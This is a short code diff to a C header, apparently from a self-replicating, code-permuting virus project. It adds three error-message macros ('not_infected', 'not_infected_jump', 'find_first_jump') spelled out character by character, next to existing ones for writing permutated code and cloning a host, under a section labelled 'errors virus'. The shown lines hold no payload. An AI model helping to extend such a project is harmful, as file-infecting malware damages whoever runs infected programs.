@@ -63,6 +63,9 @@
 #  define _ERR_T_WRITE_PERMUTATED_CODE     PD_ARRAY(char,_err_text,'\033','[','3','3','m','w','r','i','t','e','_','p','e','r','m','u','t','a','t','e','d','_','c','o','d','e','\n','\033','[','0','m',0)
 #  define _ERR_T_COPY_CLIENT_TO_CLONE      PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','o','p','y','_','c','l','i','e','n','t','_','t','o','_','c','l','o','n','e','\n','\033','[','0','m',0)
 #  define _ERR_T_ADJUST_REFERENCES         PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','j','u','s','t','_','r','e','f','e','r','e','n','c','e','s','\n','\033','[','0','m',0)
+#  define _ERR_T_NOT_INFECTED              PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t','_','i','n','f','e','c','t','e','d','\n','\033','[','0','m',0)
+#  define _ERR_T_NOT_INFECTED_JUMP         PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t','_','i','n','f','e','c','t','e','d','_','j','u','m','p','\n','\033','[','0','m',0)
+#  define _ERR_T_FIND_FIRST_JUMP           PD_ARRAY(char,_err_text,'\033','[','3','3','m','f','i','n','d','_','f','i','r','s','t','_','j','u','m','p','\n','\033','[','0','m',0)
 
 /* ------------------------------ errors virus ------------------------------ */
 
